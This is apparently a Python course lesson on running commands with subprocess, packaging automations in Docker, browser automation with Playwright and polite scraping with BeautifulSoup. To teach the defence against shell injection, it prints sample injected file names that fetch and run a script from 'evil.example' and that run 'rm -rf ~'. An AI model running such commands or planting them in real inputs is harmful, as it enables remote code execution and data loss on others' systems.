---
slug: commands-containers-browsers
title: Commands, containers and browsers
summary: Run command-line tools safely with subprocess, ship automations in Docker, drive real browsers with Playwright, and scrape HTML politely with BeautifulSoup.
minutes: 55
exercises:
  - auto-backup-args
  - auto-fix-shell-injection
  - auto-container-health
  - auto-scrape-listings
  - auto-polite-crawler
---

Not everything a client needs has an API. The nightly database backup is a command-line tool.
Uploaded photos need resizing, which ImageMagick does better than any Python library. The client's
services run in Docker, and someone should notice when one of them dies. And a property investor
wants every new flat listed on three estate agents' websites in his inbox by 07:00, none of which
offer an API or a feed. This lesson covers the tools for all of that: `subprocess` for commands,
Docker for packaging, Playwright for driving a real browser, and BeautifulSoup for reading HTML.

The browser can't start processes, containers or other browsers, so those parts are local labs.
What you practise in the drills is the Python around them: building safe argument lists, parsing
command output, and extracting data from HTML.

## Running commands with subprocess

`subprocess.run` starts a program, waits for it, and returns a `CompletedProcess` with its exit
code and output. Five arguments cover nearly every use:

```python norun
import subprocess

result = subprocess.run(
    ["pg_dump", "--format=custom", "--file=backups/clinic-2026-03-09.dump", "clinic"],
    capture_output=True,    # collect stdout and stderr instead of printing them
    text=True,              # decode them to str
    check=True,             # raise CalledProcessError if the exit code isn't 0
    timeout=600,            # raise TimeoutExpired rather than hang for ever
)
print(result.returncode, result.stdout)
```

The command is a **list**: the program, then each argument as its own item. There's no shell
involved, so spaces, quotes and semicolons in an argument are just characters. Without
`check=True`, a failed backup returns quietly with a non-zero `returncode`, and you find out the
day you need the backup. Without `timeout`, a tool waiting for a password prompt hangs your job.

## Never build a shell string

The tempting version is one f-string with `shell=True`:

```python norun
subprocess.run(f"magick {upload_name} -resize 200x thumbs/{upload_name}", shell=True)
```

A shell splits that string into words, and then runs whatever it finds. `shlex.split` splits the
way a POSIX shell does, so you can see what would happen with a file name a stranger chose:

```python
import shlex

upload_name = "photo.jpg; curl https://evil.example/x.sh | sh; echo .jpg"
shlex.split(f"magick {upload_name} -resize 200x thumbs/out.jpg")
```

The shell would run `magick photo.jpg;`, then download and run a script, then the rest. With a
list, the whole name is one argument to `magick`, which fails to find a file with that odd name
and that's the end of it. The rule: **build commands as lists, and never pass `shell=True` with
input you didn't write**. If you truly need a shell feature (a pipe, a glob), quote every piece of
outside input with `shlex.quote`, or do the piping in Python instead.

```python
import shlex

shlex.quote("photo 1.jpg; rm -rf ~")
```

> [!JS]
> Node has the same split: `child_process.exec(string)` goes through a shell, and
> `execFile(file, args)` doesn't. Use the second for the same reason.

## Parsing command output

When you need a command's output, ask for a machine format. Most modern tools have one:
`git status --porcelain`, `git log --format=...`, `docker ps --format '{{json .}}'` (one JSON
object per line), `kubectl get -o json`. The human-readable format changes between versions, and
the machine one is a promise.

```python
import json

stdout = """{"Names":"clinic-api","State":"running","Status":"Up 3 hours (healthy)"}
{"Names":"clinic-worker","State":"exited","Status":"Exited (1) 12 minutes ago"}
"""
[(c["Names"], c["State"]) for c in map(json.loads, stdout.splitlines()) if c]
```

Design your functions so the command is run by something you pass in (`run=subprocess.run`), and
the parsing is plain Python. Then a test hands in a fake `run` that returns a `CompletedProcess`
with canned output, exactly as the drills do.

## Docker in ten minutes

A **Docker image** is a snapshot of a small Linux system with your code and its dependencies
installed; a **container** is a running copy of an image. For automation work Docker solves
"it works on my machine": the client's server runs exactly the image you tested.

```dockerfile
# Dockerfile for the webhook receiver from lesson 4
FROM python:3.14-slim
COPY --from=ghcr.io/astral-sh/uv:latest /uv /usr/local/bin/uv
WORKDIR /app
COPY pyproject.toml uv.lock ./
RUN uv sync --locked --no-dev --no-install-project
COPY . .
CMD ["uv", "run", "--no-dev", "fastapi", "run", "receiver.py", "--port", "8000"]
```

```bash
docker build -t lead-receiver .
docker run --rm -p 8000:8000 --env-file .env lead-receiver     # run it; Ctrl+C stops it
docker ps --all                                                 # what's running, and what died
docker logs -f <container name>                                 # follow its output
```

For more than one container, a `compose.yaml` describes them all, and `docker compose up -d`
starts them in the background:

```yaml
services:
  receiver:
    build: .
    ports: ["8000:8000"]
    env_file: .env
    restart: unless-stopped
```

`restart: unless-stopped` brings a crashed container back, but a container that crashes on every
start just restarts for ever, and `docker ps` shows `Restarting (1) 10 seconds ago`. That's the
state the third drill looks for.

## Browser automation with Playwright

Some jobs need a real browser: a supplier portal with no API where someone logs in every month to
download invoices, a page that builds its content with JavaScript, a form that has to be filled
in. **Playwright** drives Chromium, Firefox or WebKit from Python:

```bash
uv add playwright
uv run playwright install chromium
uv run playwright codegen https://portal.supplier.example     # click around; it writes the code
```

```python norun
import os

from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.goto("https://portal.supplier.example/login")
    page.get_by_label("Email").fill(os.environ["PORTAL_EMAIL"])
    page.get_by_label("Password").fill(os.environ["PORTAL_PASSWORD"])
    page.get_by_role("button", name="Sign in").click()
    page.get_by_role("link", name="Invoices").click()
    with page.expect_download() as download:
        page.get_by_role("link", name="March 2026").click()
    download.value.save_as("invoices/2026-03.pdf")
    html = page.content()       # the page's HTML after JavaScript ran
    browser.close()
```

Locators like `get_by_role` and `get_by_label` find elements the way a person would, and they wait
for the element to appear, so there are no `sleep` calls. Browser automation is the slowest, most
fragile integration there is (a redesign breaks it), so check for an API, an export or an email
report first, and keep the Playwright part thin: get the HTML or the file, then hand it to plain
Python.

## Scraping HTML with BeautifulSoup

Whether the HTML came from httpx or from Playwright's `page.content()`, BeautifulSoup turns it into
a tree you can search with CSS selectors:

```python
from bs4 import BeautifulSoup

html = """
<article class="listing" data-id="4411">
  <h2><a href="/property/4411">2 bed flat, Canal Street</a></h2>
  <p class="price">£325,000</p>
</article>
<article class="listing sponsored" data-id="9001">
  <h2><a href="/ad/9001">Luxury penthouse</a></h2>
</article>
"""
soup = BeautifulSoup(html, "html.parser")
[
    (card["data-id"], card.select_one("h2 a").get_text(strip=True), card.select_one("h2 a")["href"])
    for card in soup.select("article.listing:not(.sponsored)")
]
```

`select` returns every match and `select_one` the first (or `None`); `get_text(strip=True)` gives
the text without surrounding whitespace; `tag["href"]` reads an attribute. Links are usually
relative, so resolve them with `urllib.parse.urljoin(page_url, href)`. Pick selectors from stable
things (ids, `data-` attributes, semantic classes) rather than layout, because layout changes.

## Scraping politely and legally

A scraper is a guest on someone else's server. Behave like one:

- **Read robots.txt.** It says which paths automated clients may visit, and sometimes how often.
  Python parses it for you (see below).
- **Go slowly.** One request at a time, with a pause between them (the `Crawl-delay`, or a second
  or more), and only as often as the data changes. Daily listings need a daily run, not one a minute.
- **Say who you are.** Send a `User-Agent` naming your bot and a contact address, so the site's
  owner can reach you instead of blocking you.
- **Check the terms and the law.** Terms of service may forbid scraping; personal data (names,
  emails, phone numbers) is covered by data protection law such as the GDPR wherever you scrape it
  from; and copying content wholesale can infringe copyright. Scraping public facts (prices,
  addresses, availability) for a client's own use is common, but this is a question for the
  client's lawyer, not something to guess at. Never scrape behind a login you weren't given.
- **Prefer the front door.** An official API, an RSS feed, a data export or a partnership email
  beats the most polite scraper.

The standard library reads robots.txt, including the crawl delay:

```python
from urllib.robotparser import RobotFileParser

robots = RobotFileParser()
robots.parse("User-agent: *\nDisallow: /account/\nCrawl-delay: 2".splitlines())
[
    robots.can_fetch("agency-bot", "https://agents.example/listings"),
    robots.can_fetch("agency-bot", "https://agents.example/account/saved"),
    robots.crawl_delay("agency-bot"),
]
```

```quiz
question: "A client wants you to collect every estate agent's contact name, email and phone from a directory site, to email them a sales offer. The site's robots.txt allows /directory. Is that enough?"
options:
  - "Yes: robots.txt allows it, so it's permitted"
  - "No: those are personal data, so data protection law and the site's terms apply, and unsolicited sales emails have their own rules"
  - "Yes, as long as you add a Crawl-delay"
answer: 1
explain: "robots.txt is a technical courtesy, not a licence. Collecting people's contact details for marketing brings in data protection and electronic marketing rules, and the site's terms. That's a conversation with the client (and their lawyer) before any code."
```

## Do it on your machine

1. In a Python REPL, run `subprocess.run(["git", "status", "--porcelain"], capture_output=True, text=True, check=True)`
   inside a repository, then outside one, and read the `CalledProcessError`.
2. Install Docker Desktop (or Docker Engine on Linux). Build and run the receiver image from this
   lesson, `curl http://localhost:8000/docs`, then `docker ps --all --format '{{json .}}'`.
3. Start a container that fails straight away with a restart policy,
   `docker run -d --name crashy --restart unless-stopped python:3.14-slim python -c "raise SystemExit(1)"`,
   look at its status in `docker ps`, and remove it with `docker rm -f crashy`.
4. `uv add playwright`, `uv run playwright install chromium`, then `uv run playwright codegen https://example.com`
   and read the code it writes as you click.
5. Write a script that fetches a real site's `robots.txt` with httpx and prints `can_fetch` for
   three URLs before you ever scrape it.

## Where this leaves you

Run commands as argument lists with `check=True` and a `timeout`, never through a shell with
outside input, and ask tools for JSON output. Docker packages an automation so it runs the same on
the client's server; Playwright handles the jobs that need a real browser; BeautifulSoup reads
the HTML either way. And a scraper reads robots.txt, goes slowly, says who it is, and respects the
law. The drills build a safe command, a container checker, a listings scraper and a polite crawler.
